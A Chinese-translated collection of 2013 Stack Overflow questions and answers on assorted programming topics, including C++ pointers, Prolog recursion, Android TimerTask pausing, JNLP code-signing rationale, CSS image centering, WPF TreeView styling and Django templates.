* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-16T00:26:29.630

您需要声明“OrderLines”应该是延迟加载的。您可以使用 FetchPlans API 或在配置中显式声明要延迟加载的关联。

如果您使用纯代码映射，您可以定义加载行为：

```
orderLineConfiguration.HasAssociation(x => x.Order).WithLoadBehavior(Telerik.OpenAccess.LoadBehavior.Lazy).WithOpposite(c => c.OrderLines); 
```

OrderLines 现在将被延迟加载。请参阅[此处](http://www.telerik.com/help/openaccess-orm/fluent-mapping-mapping-clr-mapping-associations-additional-configuration.html)和[此处](http://www.telerik.com/help/openaccess-orm/openaccess-feature-ref-fetchplans-per-query.html#Using_the_LoadWith_Method)的文档。

# c++ - 这是将指向对象的指针分配给函数的正确方法吗？

> ID：15443192
> 
> 赞同：2
> 
> 时间：2013-03-15T22:37:10.073
> 
> 标签：c++, oop, pointers

假设我有这个对象：

```
class Game{
public:
    void SetPointer(D2DResources&);

public:
    D2DResources* pD2DResources;
}; 
```

使用此功能：

```
void Game::SetPointer(D2DResources& p)
{
    pD2DResources=&p;
} 
```

我在我的 WinMain 中这样做：

```
Game game;

D2DResources d2DResources();

game.SetPointer(d2DResources); 
```

它会起作用吗？如果没有，正确的方法是什么？这个想法是稍后访问 d2DResources 的函数，如下所示：

```
pGame->pD2DResources->OnRender(); 
```

pGame 是指向上述游戏对象的指针。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T22:40:45.517

只要指向的实例保持活动状态，我认为您的方法没有问题。但是您似乎想在函数中声明实例`WinMain`，在这种情况下它将不起作用。

让我们先弄清楚：以下行

```
D2DResources d2DResources(); 
```

将声明一个函数，该函数返回 a`D2DResources`并且没有参数，而不是类型的变量`D2DResources`。如果您想要后者，请删除括号：

```
D2DResources d2DResources; 
```

现在，如果您想让实例保持更长的活动时间，您应该使用`std::shared_ptr`. 一个示例可能如下所示：

```
class Game{
public:
    void SetPointer(D2DResources&);

public:
    std::shared_ptr<D2DResources> pD2DResources;
};

void Game::SetPointer(std::shared_ptr<D2DResources> p)
{
    pD2DResources=p;
} 
```

在 中`WinMain`，使用：

```
Game game;

auto d2DResources = std::make_shared<D2DResources>();

game.SetPointer(d2DResources); 
```

用法与您想要的相同。

# prolog - Prolog中的系列之和

> ID：15443197
> 
> 赞同：1
> 
> 时间：2013-03-15T22:37:25.917
> 
> 标签：prolog, exponentiation

我想使用 Prolog 程序找到一个系列的总和。为此，我编写了以下程序：

```
pow(N,1,R):- R is N.
pow(N,M,R):- X is M-1,pow(N,X,R1),R is R1*N.

sum(N,1,R) :- R is N+1 . 
sum(N,M,R) :- X is M-1, X>1,sum(N,X,R1),pow(N,M,R2), R is (R1+R2). 
```

我想找到以下系列的总和：

```
1+n+n^2+n^3+..................+n^m 
```

我相信上面的代码是正确的。但是当我运行程序时，它显示输出 "No" 。为什么 ？我已经尝试了很多，但无法获得预期的输出。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T23:09:59.533

你错过了 else 分支`X>1`，如果你删除它，你会得到一个结果：

```
...
sum(N,M,R) :- X is M-1, sum(N,X,R1), pow(N,X,R2), R is (R1+R2).
...
?- sum(2,3,X).
X = 15 ;
^C 
```

但程序不会终止（^C 用于中断循环）。

我会使用累加器重写，以获得 LCO（最后调用优化）和内置 pow 所允许的更好的效率：

```
sum(N,M,R) :- sum(N,M,0,R).

sum(N,M,A,R) :-
    (   M > 0
    ->  A1 is A + N^M, %% N**M,
        M1 is M-1,
        sum(N,M1,A1,R)
    ;   R is A + 1
    ). 
```

*编辑*关于运算符 (**)/2 的 SWI-Prolog 文档不正确：最好使用 (^)/2，如 @false 所述

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T23:15:34.647

我的另一个解决方案如下：

```
pow(N,1,R):- R is N.
pow(N,M,R):- X is M-1,pow(N,X,R1),R is R1*N.

sum(N,1,R) :- R is N+1 . 
sum(N,M,R) :- M>1,X is M-1,sum(N,X,R1), R is (R1+N**M). 
```

# ruby-on-rails - 缩略图悬停时的咖啡脚本图像更改

> ID：15443202
> 
> 赞同：0
> 
> 时间：2013-03-15T22:37:51.907
> 
> 标签：ruby-on-rails, html, coffeescript

我有一个产品页面[http://pants.telegraphbranding.com/t/women/long-sleeve](http://pants.telegraphbranding.com/t/women/long-sleeve)，当您将鼠标悬停在主图像下方的缩略图上时，主图像应该切换到缩略图。但事实并非如此，我不知道为什么。

我正在使用带有 ruby​​ 方法的 html 数据元素来为每个产品分配产品 ID：

```
<div class="main-image" data-productid="<%= product.id %>"> 
```

这是我的咖啡脚本：

```
add_image_handlers = ->

 thumbnails = ($ '.product-images ul.thumbnails')
 ($ '.main-image').data 'selectedThumb', 'productid', $(this).find('img')
 thumbnails.find('li').eq(0).addClass 'selected'
 thumbnails.find('a').on 'click', (event) ->
  ($ '.main-image').data 'selectedThumb', ($ event.currentTarget).attr('href')
  ($ '.main-image').data 'selectedThumbId', ($ event.currentTarget).parent().attr('id')
  ($ this).mouseout ->
     thumbnails.find('li').removeClass 'selected'
     ($ event.currentTarget).parent('li').addClass 'selected'
  false
thumbnails.find('li').on 'mouseenter', (event) ->
  $(this).find('img').attr 'src', ($ event.currentTarget).find('a').attr('href')

thumbnails.find('li').on 'mouseleave', (event) ->
  $(this).find('img').attr 'src', ($ '.main-image').data('selectedThumb') 
```

感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T23:19:30.317

似乎当您将鼠标悬停在`<li>`元素上时，您的 src 属性设置为“productid”。

嗯......也许更简洁的东西就足够了？

```
$('.product-images ul.thumbnails li').hover(function() {
  var href = $(this).find('a').attr('href');
  $(this).closest('.product').find('.main-image a img').attr('src', href);
}, function() {}); 
```

在咖啡中：

```
$(".product-images ul.thumbnails li").hover (->
  href = $(this).find("a").attr("href")
  $(this).closest(".product").find(".main-image a img").attr "src", href
), -> 
```

我将图像来源的选择留给您。在测试之前删除您的代码。

# ruby-on-rails - 同步调用一个handle_asynchronously方法

> ID：15443204
> 
> 赞同：1
> 
> 时间：2013-03-15T22:37:55.517
> 
> 标签：ruby-on-rails, delayed-job

我正在使用Rails 和delayed_job，并且标记了我的一种方法，`handle_asynchronously`以便调用它会自动放入DJ 队列中。有没有办法覆盖这个声明并同步调用它？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-21T20:19:05.890

我还没有尝试过，但你应该能够调用你的方法并`_without_delay`附加它的名字，因为 DJ 使用`alias_method_chain`when`handle_asynchronously`被调用。

所以如果你有`handle_asynchronously :do_work`你会打电话给`do_work_without_delay`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-16T22:02:15.503

我在我的环境文件中打补丁，因为有时我正在测试调用异步方法的东西：

```
 module Delayed::MessageSending::ClassMethods
    def handle_asynchronously(*opts)
      # no-op
    end
  end 
```

# c++ - 查找向量中是否存在相同结构的最快方法

> ID：15443205
> 
> 赞同：1
> 
> 时间：2013-03-15T22:37:55.183
> 
> 标签：c++, c, vector, struct

假设我有一个 people 结构：

```
struct Person {
    char name[100];
    char surname[100];
    unsigned int age;
}; 
```

我想找出最快的方法来搜索并查找向量中是否已经存在具有相同值（相同名称、相同姓氏、相同年龄）的另一个结构。

请记住，我在一个向量中有数百万个。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-15T22:49:08.797

这是一种可能性：

```
#include <iostream>
#include <string>
#include <vector>
#include <set>
#include <tuple>

struct Person {
    std::string name;
    std::string surname;
    unsigned int age;

    bool operator<(const Person &x) const
    {
        return std::tie(name, surname, age) < std::tie(x.name, x.surname, x.age);
    }
};

int main()
{
    std::vector<Person> v;

    // ...

    std::set<Person> s;
    for (const auto &x : v)
    {
        auto i = s.insert(x);
        if (!i.second)
        {
            // x is duplicated
        }
    }
} 
```

对于您的评论，您可以通过以下方式对矢量进行排序：

```
std::sort(v.begin(), v.end()); // Operator < is overloaded 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-16T05:47:02.503

根据问题中的评论，特别是

> 不，我的意思是一组描述 10 与 2、12、54 等重复，或者 2 与 10、12、54 重复

听起来你真正想要的数据结构是`std::multimap`（或者`std::unordered_multimap`如果你有 C++11 并且不关心顺序）。Multimaps 将负责您必须使用 M. M. 的解决方案自己进行的簿记（这总体上很好，除了您必须维护一个带有重复描述的附加容器）。`std::multimap`为您做额外的簿记。

```
#include <map>     // or <unordered_map>
#include <string>
#include <tuple>   // std::tie()
#include <utility> // std::make_pair()

struct Person {
  std::string name;
  std::string surname;
  unsigned int age;

  bool operator<(const Person &x) const
  {
    return std::tie(name, surname, age) < std::tie(x.name, x.surname, x.age);
  }
};

extern bool tryReadNextPersonFromFile(Person &, size_t & record_id);

int main()
{
  std::multimap<Person, size_t> persons;
  Person p;
  size_t rid;

  while(tryReadNextPersonFromFile(p, rid)) {
    persons.insert(std::make_pair(p, rid));
  }

  // ...

  p = ...
  size_t howMany = persons.count(p);
  if(0 == howMany) { /* not found ... */ }
  else {
    auto eq_range = persons.equal_range(p);
    for(auto it=eq_range.first; it != eq_range.second; ++it) {
      size_t pRecordID = it->second;
      // ...
    }
  }
} 
```

为简洁起见，我使用了很多 C++11 语法（如`auto`），但这个想法同样适用于 C++03。由于您之前可能没有听说过 multimaps（或者至少不熟悉 STL 界面），因此请务必查看例如[一些](http://www.cplusplus.com/reference/map/multimap/)关于您可以使用它以及如何使用它的文档。

# objective-c - 如何创建位数组目标 C

> ID：15443212
> 
> 赞同：0
> 
> 时间：2013-03-15T22:38:18.600
> 
> 标签：objective-c, bitarray

我想为数组中的项目创建一个位数组或位向量，以便我可以创建一个二进制指纹来与对象的指纹进行比较。

这是一个例子：

基本指纹......所有“可用”颜色

1.  colorsArray[蓝、红、白、绿、橙]；

2.  把它变成一个二进制数组（或其他）

3.  这是结果 = masterPrint[1,1,1,1,1];

4.  现在我有一个单独的对象，其中包含红色和蓝色 (object[red,blue])

5.  这个对象的指纹是对象的 print = [1,1,0,0,0];

6.  比较两个打印，主打印[1,1,1,1,1]和对象打印[1,1,0,0,0]；

7.  结果是两场比赛 40%

我怎样才能做到这一点？谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-15T22:45:04.270

更好的选择是**CFMutableBitVector**

**CFBitVector**及其派生的可变类型**CFMutableBitVector**管理位值的有序集合，它们是`0`或`1`。

**CFBitVector**创建静态位向量，**CFMutableBitVector**创建动态位​​向量。

[请参阅此处](http://developer.apple.com/library/mac/#documentation/CoreFoundation/Reference/CFBitVectorRef/Reference/reference.html)的类参考

# linux - 在类 Unix 操作系统中从源文件构建库

> ID：15443216
> 
> 赞同：1
> 
> 时间：2013-03-15T22:38:52.533
> 
> 标签：linux, macos, unix, makefile

从源文件构建任何库时，是否可以设置我想要安装它的位置？我读过一些`prefix`标志，但我想知道是否所有应用程序都有那个标志。

例如，我正在从源代码构建 OpenCV，当我`make && make install`将内容安装在其中时，`/usr/local/opencv`但是如果我希望将它安装在什么位置`/other/place/opencv`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T22:41:10.800

如果我正确地跟随你，那么这些东西是在*配置阶段*完成的，比如：

```
$ ./configure --prefix=/other/place/opencv 
```

如果项目没有`configure`脚本，那么这是`Makefile`直接编辑的情况。

# android - 如何暂停和恢复 TimerTask/Timer

> ID：15443219
> 
> 赞同：22
> 
> 时间：2013-03-15T22:38:59.233
> 
> 标签：android, timer, onresume, timertask, onpause

我的 Android 应用程序中有一个动画，它会闪烁不同颜色的 TextView。我使用了 TimerTask、Timer 和 Runnable 方法来实现它。我需要做的是在 onPause() 动画期间用户离开应用程序时停止线程，并在 onResume() 中用户返回应用程序时恢复线程。以下是我实现的代码，但它不起作用（onPause() 和 onResume() 部分），我不明白为什么。我已经阅读了一些关于类似问题的其他帖子，但它们并没有帮助我弄清楚在我的情况下该怎么做。我读过 TimerTasks 已经过时了，我可能应该使用 ExecutorService 方法；我不清楚如何实现这个功能。

```
 ...timerStep5 = new TimerTask() {

        @Override
        public void run() {
            runOnUiThread(new Runnable() {
                  @Override
                  public void run() {
                if (b5) {
                    cashButton2SignalText.setBackgroundColor(Color.RED);
                    cashButton2SignalText.setTextColor(Color.WHITE);
                    b5=false;
                } else {
                    cashButton2SignalText.setBackgroundColor(Color.WHITE);
                    cashButton2SignalText.setTextColor(Color.RED);
                    b5=true;
                }
                }
            });
        }
};

timer5.schedule(timerStep5,250,250);

}

public void onPause(){

    super.onPause();

    timerStep5.cancel();

}

public void onResume(){

    super.onResume();

    timerStep5.run();

} 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-03-15T23:05:15.100

a`TimerTask`被取消后就不能再运行了，必须创建一个新的实例。

在此处阅读详细信息：

[https://stackoverflow.com/a/2098678/727768](https://stackoverflow.com/a/2098678/727768)

`ScheduledThreadPoolExecutor`推荐用于较新的代码，它可以处理异常和任务花费比计划间隔更长的时间等情况。

但是对于你的任务来说，`TimerTask`应该足够了。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2016-08-20T00:06:42.193

这就是我的做法。在暂停发生的地方添加`pauseTimer`布尔值（也许是按钮侦听器），如果为真，则不计算计时器。

```
private void timer (){
    Timer timer = new Timer();
    tv_timer = (TextView) findViewById(R.id.tv_locationTimer);
    countTimer = 0;
    timer.scheduleAtFixedRate(new TimerTask() {
        @Override
        public void run() {
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    String s_time = String.format("%02d:%02d:%02d",
                            countTimer / 3600,
                            (countTimer % 3600) / 60,
                            countTimer % 60);
                    tv_timer.setText(s_time);
                    if (!pauseTimer) countTimer++;
                }
            });
        }
    }, 1000, 1000);
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2020-11-02T07:23:23.347

对于 Kotlin 用户，请查看[此](https://github.com/huynguyennovem/Android-CountDownTimer-Ext)

如何使用：

```
// Init timer
lateinit var timerExt: CountDownTimerExt

timerExt = object : CountDownTimerExt(TIMER_DURATION, TIMER_INTERVAL) {
    override fun onTimerTick(millisUntilFinished: Long) {
        Log.d("MainActivity", "onTimerTick $millisUntilFinished")
    }

    override fun onTimerFinish() {
        Log.d("MainActivity", "onTimerFinish")
    }

}

// Start/Resume timer
timerExt.start()

// Pause timer
timerExt.pause()

// Restart timer
timerExt.restart() 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-08-08T10:33:23.520

```
Timer timer1;
private boolean timerStartFlag = false;
private boolean hiddenVisibleFrg = false;
int timerSize = 0;
int videoTime = 0;

@Override
public void onPause() {
    super.onPause();

    Log.e("keshav", "onPause timer1 " +timer1);
    if (timerSize >0 &&hiddenVisibleFrg){
        timerStartFlag =true;
    }

    if (timer1 != null) {
        this.timer1.cancel();
    }

}

@Override
public void onResume() {
    super.onResume();

    if (timerSize >0 && timerStartFlag && hiddenVisibleFrg) {
        callTimerTask(timerSize);
        timerStartFlag = false;
    }
}

@Override
public void onHiddenChanged(boolean hidden) {
    super.onHiddenChanged(hidden);

    if (!hidden) {
        Log.e("keshav", "HomeFragment  visible ");

        if (timerSize >0 && timerStartFlag) {
            callTimerTask(timerSize);
            timerStartFlag=false;
        }

        hiddenVisibleFrg=true;

    } else {
        Log.e("keshav", "HomeFragment in visible " +timer1);
        if (timer1 != null) {
            this.timer1.cancel();
        }
        if (timerSize >0){
            timerStartFlag =true;
        }
        hiddenVisibleFrg=false;
    }
}

private void callTimerTask(int size) {
    // TODO Timer for auto sliding
    printLog("callTimerTask size " + size);
    timer1 = new Timer();
    timer1.schedule(new TimerTask() {
        @Override
        public void run() {
            if (getActivity() != null) {
                getActivity().runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        if (getActivity() == null) {
                            return;
                        }
                        if (count1 < size - 1) {
                            //TODO ADD ME kk
                            count1++;
                        } else {
                            count1 = 0;
                        }
                        if (intro_images != null) {
                            intro_images.setCurrentItem(count1);
                        }
                        videoTime++;
                        Log.e("KeshavTimer", "callTimerTask videoTime " + videoTime);
                    }
                });
            } else {
                printLog("callTimerTask getActivity is null ");
            }
        }
    }, 1000, 1000);
    // TODO  1000, 3000;
} 
```

# java - Java JNLP 需要签名的目的是什么？

> ID：15443228
> 
> 赞同：3
> 
> 时间：2013-03-15T22:40:00.690
> 
> 标签：java, security, digital-signature, jnlp

我对安全基础知识和数字签名之类的东西了解有限。例如，我了解数字签名在公钥密码学中的用途。但是，我不明白为什么需要签署我的 JNLP，或者它可以防止什么恶意，我也无法找到这些信息。

我发现允许部署未签名的 JNLP，但磁盘和网络访问等内容受到限制。但是，假设我是一个恶意的人，他制作了一个 Java 应用程序，该应用程序会对您的磁盘内容进行恶意操作（我将其伪装成其他东西）。我可以轻松地签署、部署它，然后您可以毫无戒心地访问我的网站，然后启动应用程序并让您的磁盘受到攻击。在这种情况下......签名完成了什么？

更重要的是...如果有人可以简单地签署申请而几乎不需要任何努力...那有什么意义呢？

我确定我错过了一些非常明显的东西......请赐教。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-15T23:15:23.250

您不能*只*签署某些东西 - 如果您希望浏览器不受限制地执行它，则不能。用于签署软件的证书必须使用另一个证书进行签署，依此类推，直到[*信任链*](http://en.wikipedia.org/wiki/Chain_of_trust)到达已安装在浏览器中的[*根证书。*](http://en.wikipedia.org/wiki/Root_certificate)

虽然偶尔*会有*一些不太勤奋的[证书颁发机构](http://en.wikipedia.org/wiki/Certificate_Authority)，但如果不提供一些您的（网络）身份证明，您通常无法获得这样的证书。这意味着恶意的人必须提供某种身份证明，尽管它可能很少。更重要的是，CA 预计会[撤销](http://en.wikipedia.org/wiki/Revocation_list)已用于恶意活动或以其他方式受到损害的证书，从而限制暴露程度。

直截了当地说，如果您在站点中使用 CA 签名的证书，并且该证书用于分发恶意软件，那么 CA 会尽快撤销您的证书。另一方面，如果您使用自签名证书，浏览器将要求用户确认其使用。如果用户不顾警告而继续使用它，那么这是他们自己的错，*不是*吗？毕竟，对于愚蠢或无知，没有通用的对策……

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T17:25:19.760

这个问题确实提出了一些有效的观点，thkala 为受信任的权威机构颁发的 CA 的价值提供了很好的辩护。

但是为什么我们需要 CA 来处理 JNLP 而不是常规的可执行 JAR 文件呢？我认为原因是 JNLP 旨在从浏览器启动。JNLP 文件是在沙箱中与浏览器一起运行的小程序的替代品——理论上可以避免对您的计算机造成任何损害。用户只需访问一个页面就可以启动在小程序中运行的 jar 文件。同样，只需单击一个按钮即可启动 JNLP。在 Chrome 中，我被要求首先保存 JNLP。但在 IE 或 Firefox 中，我会看到一个启动按钮或常规 Web 链接——它看起来像网页中的任何其他按钮或链接——然后单击即可运行程序。这比下载可执行文件然后运行它要简单一些。

另一方面，可执行 JAR 文件可以通过多种方式安装或运行。例如，它们通常与 MRI 一起打包在 CD 上，因为一些 MRI 查看软件在 JVM 上运行，并且患者或医生需要启动定制软件来查看 MRI。但是这个软件没有得到“安装”。您只需从 CD 运行它。

另一方面，JNLP 可以更像安装程序而不是独立程序。我已经能够让他们创建桌面快捷方式并进行文件关联。从用户的角度来看，我的 JNLP 应用程序感觉就像一个具有自己的图标和文件类型的本机程序。由于它在浏览器中运行得如此隐蔽，并​​且可以不受限制地访问客户端 PC，因此让它“签名和受信任”可以让用户在运行它时感觉更安全。

从历史上看，我相信这就是 JNLP 和小程序得到签名的原因。**我相信这次签约的实用价值已经到期。**

首先，从 CA 签署您的应用程序需要花费数百美元，因此许多公司都跳过了这一点。有一些合作的应用程序运行自签名代码，用户只知道在浏览器发出警告后点击“接受”按钮。

更重要的是，最近针对 Java 的安全更新集中在修补后门，这些后门允许**未签名的代码**离开沙箱并执行已签名的 applet 或 JNLP 可以执行的所有操作。似乎每次甲骨文修补沙盒的出路时，都会有人找到不同的出路。最好的解决方案是让运行时**始终提示**允许运行 Java 小程序或 JNLP 文件的用户。自签名的 JNLP 文件不仅可以访问本地文件系统和 LAN，而且未签名的 JNLP 也可以。如果用户从 Oracle 获得了最新的安全更新（当然，大多数人没有），并且在发现下一个从沙箱滑出的巧妙方法之前，沙箱模型确实按预期工作。但是对于大多数用户来说，大多数时候，sanbox 模型并没有按预期工作。我认为是时候让所有 JNLP 文件请求运行权限，并为它们提供与常规 JAR 文件相同的访问权限。

这样我就不必每 6 个月重新创建一次安全证书。

# jquery - 垂直居中响应图像

> ID：15443230
> 
> 赞同：8
> 
> 时间：2013-03-15T22:40:11.490
> 
> 标签：jquery, css, twitter-bootstrap, responsive-design

我想知道是否有一种简单的方法可以将响应式图像垂直居中。

请参考以下jsFiddle：http: [//jsfiddle.net/persianturtle/yawTb/1/](http://jsfiddle.net/persianturtle/yawTb/1/)

基本 HTML：

```
<img class="mobile-title-size" src="http://zx85.dyndns.org/raphtest/img/title.png" alt="Logo"> 
```

基本 CSS：

```
.mobile-title-size {
position: absolute;
top: 2.5%;
left: 6%;
width: 70%;
max-width: 300px; 
```

}

这是使用在平板电脑和桌面视口上显示的相同图像的移动标题。由于图像已经被加载，我希望使用相同的图像，将其调整为更小并垂直对齐，以便我可以将一个图像用于所有视口。

**问题：**在浏览器调整大小时，图像确实变小了，但它并没有在中心垂直对齐。

**目标：**即使在此示例中宽度重叠严重，但在我的站点上这不是问题。目标只是在浏览器调整大小时使图像垂直居中。

我可以使用 javascript/jQuery 解决方案，但当然首选简单的 CSS。

任何帮助是极大的赞赏！

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2013-03-15T23:04:14.820

有几种方法可以做到这一点——纯粹的 CSS 或基于 JS 的方法。

* * *

## 更新的答案

**更新：**随着 CSS 变换支持的出现，这里有一个相当优雅的使用纯 CSS 定位元素的解决方案。使用给定的标记：

```
<div class="container">
    <img src="..." alt="..." title="..." />
</div> 
```

对于您的 CSS：

```
.container {
    /* The container has to have a predefined dimension though */
    position: relative;
}
.container img {
    position: absolute;
    top: 50%;
    left: 50%;
    -webkit-transform: translate(-50%, -50%);
    transform: translate(-50%, -50%);
} 
```

[更新了 JSFiddle](http://jsfiddle.net/teddyrised/yawTb/36/)

* * *

## 旧答案

对于 CSS，您可以在元素的容器内构造一个 ghost`<img>`元素。Chris Coyier[就这项技术写了一篇出色的文章](http://css-tricks.com/centering-in-the-unknown/)。假设您的 HTML 代码如下所示：

```
<div class="container">
    <img src="..." alt="..." title="..." />
</div> 
```

那么你的 CSS 将是：

```
.container {
    font-size: 0;
    text-align: center;
}
.container:before {
    content: "";
    display: inline-block;
    height: 100%;
    vertical-align: middle;
}
.container > img {
    display: inline-block;
    vertical-align: middle;
} 
```

可以在这个小提琴中看到功能性 CSS 修复 - [http://jsfiddle.net/teddyrised/yawTb/8/](http://jsfiddle.net/teddyrised/yawTb/8/)

或者，您可以使用基于 JS 的方法：

```
$(document).ready(function() {
    $(window).resize(function() {
        $(".container > img").each(function() {
            var cHeight = $(this).parent(".container").height(),
                cWidth = $(this).parent(".container").width(),
                iHeight = $(this).height(),
                iWidth = $(this).width();

            $(this).css({
                top: 0.5*(cHeight - iHeight),
                left: 0.5*(cWidth - iWidth)
            });
        });
    }).resize();  // Fires resize event when document is first loaded
}); 
```

但是您必须使用以下 CSS：

```
.container {
    position: relative;
}
.container img {
    position: absolute;
    z-index: 100;
} 
```

[编辑]：对于绝对定位图像元素的基于 JS 的方法，您必须明确说明`.container`元素的尺寸，或者在其中包含一些内容（但这有点违背目的，因为图像将在上方内容）。这是因为图像元素已从文档流中取出，因此其尺寸不会影响父容器的大小。

JS 版本的工作示例在这里 - [http://jsfiddle.net/teddyrised/yawTb/7/](http://jsfiddle.net/teddyrised/yawTb/7/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-05-08T16:45:56.970

您拥有的解决方案适用于旧浏览器，但在不久的将来（现在大约有 80% 的浏览器支持）您可以做到这一点，这是一个更简单、更优雅的解决方案：

```
.container img{
  width: 100%;
  height: auto;
}
@supports(object-fit: cover){
    .container img{
      height: 100%;
      object-fit: cover;
      object-position: center center;
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-16T01:30:33.853

所以，我发现了一些我想要的东西：http: [//jsfiddle.net/fmwzT/](http://jsfiddle.net/fmwzT/)

问题是它只适用于引导程序的最新版本 2.3.1，我不知道为什么（我的网站上有 2.3.0）。

所以现在我已经回答了我的问题并提出了一个更大的问题，是什么导致它起作用？

请注意，它确实使用以下代码：

HTML

```
<div id="f1"><div id="outer-element"><img id="inner-element" src="http://zx85.dyndns.org/raphtest/img/title.png" alt="Logo"></div></div> 
```

CSS

```
#fl {
    float: left;
}

#outer-element {
    display: table-cell;
    vertical-align: middle;
    height: 40px;
    max-width: 300px;
}

#inner-element {
    display: inline-block;
    margin-left: -20px;
} 
```

注意：如果没有 Bootstrap 的最新 2.3.1 版本，这将不起作用。

我发个问题看看有没有人知道！

# c# - 带有切换按钮的 TreeView MasterDetails

> ID：15443231
> 
> 赞同：2
> 
> 时间：2013-03-15T22:40:13.573
> 
> 标签：c#, wpf, xaml, templates, styles

我想创建一个带有样式的 MasterDetails TreeView。

从[这个问题](https://stackoverflow.com/questions/1499016/reusing-a-treeviews-expand-and-collapse-buttons-in-wpf)我想重用切换按钮

这是我的 XAML

```
<Window x:Class="TreeViewMasterDetails.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:local="clr-namespace:TreeViewMasterDetails" 
        Title="MainWindow" Height="350" Width="525">
    <Grid>
        <Grid.Resources>
            <ControlTemplate x:Key="toggleButtonTemplate" TargetType="ToggleButton">
                <Grid Width="15" Height="13" Background="Transparent">
                    <Path x:Name="ExpandPath"
              HorizontalAlignment="Left" 
              VerticalAlignment="Center" 
              Margin="1,1,1,1"
              Fill="{StaticResource GlyphBrush}"
              Data="M 4 0 L 8 4 L 4 8 Z"/>
                </Grid>
                <ControlTemplate.Triggers>
                    <Trigger Property="IsChecked"
                 Value="True">
                        <Setter Property="Data"
                  TargetName="ExpandPath"
                  Value="M 0 4 L 8 4 L 4 8 Z"/>
                    </Trigger>
                </ControlTemplate.Triggers>
            </ControlTemplate>
            <Style x:Key="toggleButtonStyle" TargetType="ToggleButton">
                <Setter Property="Template" Value="{StaticResource toggleButtonTemplate}" />
            </Style>

            <ControlTemplate TargetType="{x:Type TreeViewItem}" x:Key="selectedItemTemplate">

                <Grid Height="Auto">
                    <Grid.RowDefinitions>
                        <RowDefinition Height="Auto"></RowDefinition>
                        <RowDefinition Height="Auto"></RowDefinition>
                        <RowDefinition Height="Auto"></RowDefinition>
                    </Grid.RowDefinitions>
                    <Grid.ColumnDefinitions>
                        <ColumnDefinition Width="20"></ColumnDefinition>
                        <ColumnDefinition Width="Auto"></ColumnDefinition>
                    </Grid.ColumnDefinitions>

                    <ToggleButton x:Name="toggleButton" Height="20" Width="20" Style="{StaticResource toggleButtonStyle}" />
                    <TextBlock Grid.Row="0" Grid.Column="1" Text="{Binding Id}"></TextBlock>
                    <TextBlock Grid.Row="1" Grid.Column="1" Text="{Binding Name}"></TextBlock>
                    <TextBlock Grid.Row="2" Grid.Column="1" Text="{Binding Description}"></TextBlock>
                </Grid>
            </ControlTemplate>
        </Grid.Resources>

        <TreeView Height="Auto" 
                  HorizontalAlignment="Stretch" 
                  Margin="10" 
                  VerticalAlignment="Stretch" 
                  Width="Auto"
                  ItemsSource="{Binding Items}">
            <TreeView.ItemContainerStyle>
                <Style TargetType="TreeViewItem">
                    <Style.Triggers>
                        <Trigger Property="IsSelected" Value="True">
                            <Setter Property="Template" Value="{StaticResource selectedItemTemplate}"/>
                        </Trigger>
                    </Style.Triggers>
                </Style>
            </TreeView.ItemContainerStyle>
            <TreeView.ItemTemplate>
                <HierarchicalDataTemplate DataType="x:Type local:NodeViewModel" ItemsSource="{Binding Children}">
                    <Grid>
                        <Grid.RowDefinitions>
                            <RowDefinition Height="20*" />
                        </Grid.RowDefinitions>
                        <Grid.ColumnDefinitions>
                            <ColumnDefinition Width="100*" />
                            <ColumnDefinition Width="100*" />
                            <ColumnDefinition Width="100*" />
                        </Grid.ColumnDefinitions>

                        <TextBlock Grid.Column="0" Text="{Binding Id}"></TextBlock>
                        <TextBlock Grid.Column="1" Text="----"></TextBlock>
                        <TextBlock Grid.Column="2" Text="{Binding Name}"></TextBlock>
                    </Grid>

                </HierarchicalDataTemplate>
            </TreeView.ItemTemplate>
        </TreeView>
    </Grid>
</Window> 
```

请原谅 XAML 的大块，但我真的不知道异常来自哪里。

但是现在我得到了一个没有更多信息的 StaticResourceHolder 异常。我只知道它与ToggleButton 有关。

所以，有两个问题：

1.  如何了解有关我的 XAML 有什么问题的更多信息？

2.  XAML 有什么问题？

这是我的项目视图模型：

```
public class NodeViewModel : ViewModelBase
    {
        public string Id { get; set; }
        public string Name { get; set; }
        public string Description { get; set; }

        public ObservableCollection<NodeViewModel> Children { get; set; }
    } 
```

# python - Django 多字典解析

> ID：15443233
> 
> 赞同：0
> 
> 时间：2013-03-15T22:40:20.540
> 
> 标签：python, django, dictionary

我正在尝试在我的 HTML 中解析以下数据结构。

```
{'GROUPS': {'Group1': [{'key1':'value1','key2':'value2'}, {'key1':'value3', 'key2':'value4'}], 'Group2': [{'key1':'value5','key2':'value6'}, {'key1':'value7', 'key2':'value8'}]}} 
```

我拥有的解析代码如下：

```
<tbody>
{% for group,data in data|get_value:"GROUPS" %} 
<tr>
    <td>{{ group }}</td>
    {% for v in data.items %}
    <tr>
        <td>{{ v|get_value:"key1" }}</td>
        <td>{{ v|get_value:"key2" }}</td>
    </tr>
    {% endfor %}
</tr>
{% endfor %}
</tbody> 
```

get_value 是我编写的自定义过滤器，它基本上采用键和数据结构，然后返回值。

